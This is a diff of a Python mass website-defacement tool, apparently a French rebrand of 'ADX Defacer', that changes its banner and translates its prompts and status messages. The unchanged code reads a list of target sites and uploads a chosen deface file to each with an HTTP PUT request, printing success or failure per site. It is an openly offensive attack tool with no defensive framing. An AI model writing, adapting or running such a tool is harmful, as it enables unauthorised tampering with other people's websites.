@@ -5,17 +5,18 @@ try:
    import os.path
    import sys
 except ImportError:
-   exit("install requests and try again ...")
+   exit(" fait apt install requests...")
 
 banner = """
 
- █████╗ ██╗  ██╗██████╗  Author : Charlie : The Hacker
-██╔══██╗╚██╗██╔╝██╔══██╗ Credit : Ranginang67
-███████║ ╚███╔╝ ██║  ██║ Tools  : ADX Defacer V1.0
-██╔══██║ ██╔██╗ ██║  ██║ Github : CharlieTheHack1
-██║  ██║██╔╝ ██╗██████╔╝ youtube : Charlie : The Hacker
-╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
-"""
+ 
+""" 
+BIENVENUE
+ _   _    _    ____  ____  _____ _____ _    ____ _____
+| | | |  / \  |  _ \|  _ \| ____|  ___/ \  / ___| ____|
+| |_| | / _ \ | |_) | | | |  _| | |_ / _ \| |   |  _|
+|  _  |/ ___ \|  __/| |_| | |___|  _/ ___ \ |___| |___
+|_| |_/_/   \_\_|   |____/|_____|_|/_/   \_\____|_____|
 
 b = '\033[31m'
 h = '\033[32m'
@@ -43,9 +44,9 @@ def aox(script,target_file="target.txt"):
                site = "http://" + site
             req = s.put(site+"/"+script,data=op)
             if req.status_code < 200 or req.status_code >= 250:
-               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
+               print(m+"["+b+" RATÉ!"+m+" ] %s/%s"%(site,script))
             else:
-               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))
+               print(m+"["+h+" RÉUSSITE"+m+" ] %s/%s"%(site,script))
 
          except requests.exceptions.RequestException:
             continue
@@ -56,9 +57,9 @@ def main(__bn__):
    print(__bn__)
    while True:
       try:
-         a = x("Enter your script deface name: ")
+         a = x("ENTRE LE NOM DU FICHIER a upload sur les sites: ")
          if not os.path.isfile(a):
-            print("file '%s' not found"%(a))
+            print("fichier '%s' non trouvé"%(a))
             continue
          else:
             break
